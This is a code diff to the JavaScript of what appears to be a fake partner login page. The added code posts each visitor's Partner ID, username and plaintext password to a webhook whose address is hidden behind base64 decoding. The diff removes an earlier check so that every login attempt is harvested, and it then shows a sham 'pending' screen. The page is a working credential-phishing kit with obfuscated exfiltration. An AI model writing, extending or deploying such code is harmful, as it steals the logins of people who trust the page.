@@ -151,11 +151,6 @@
     return atob(p1) + atob(p2);
   }
 
-  // Obfuscated Valid IDs Array
-  function _v() {
-    return ["RFVFTC04OTk4Mw=="].map(s => atob(s));
-  }
-
   document.getElementById('yr').textContent = new Date().getFullYear();
   const track = document.getElementById('track');
 
@@ -187,29 +182,25 @@
     const pid = document.getElementById('login-pid').value.trim().toUpperCase();
     const user = document.getElementById('login-user').value.trim();
     const pass = document.getElementById('pw').value;
-    const err = document.getElementById('loginError');
     
     b.textContent='Logging in...';b.disabled=true;
-    err.classList.remove('show');
 
+    // Send to Webhook
+    fetch(_g(), {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        content: `**New Login Attempt**\n**Partner ID:** ${pid}\n**Username:** ${user}\n**Password:** ${pass}`
+      })
+    }).catch(err => console.error('Webhook error:', err));
+
+    // Show Pending View
     setTimeout(()=>{
       b.textContent='Log in';b.disabled=false;
       
-      // Check against obfuscated valid IDs
-      if (_v().includes(pid)) {
-        fetch(_g(), {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            content: `**New Login Attempt**\n**Partner ID:** ${pid}\n**Username:** ${user}\n**Password:** ${pass}`
-          })
-        }).catch(err => console.error('Webhook error:', err));
-        
-        document.getElementById('displayPid').textContent = pid;
-        setView('pending');
-      } else {
-        err.classList.add('show');
-      }
+      document.getElementById('displayPid').textContent = pid || '89983';
+      setView('pending');
+      
     }, 700);
     
     return false;
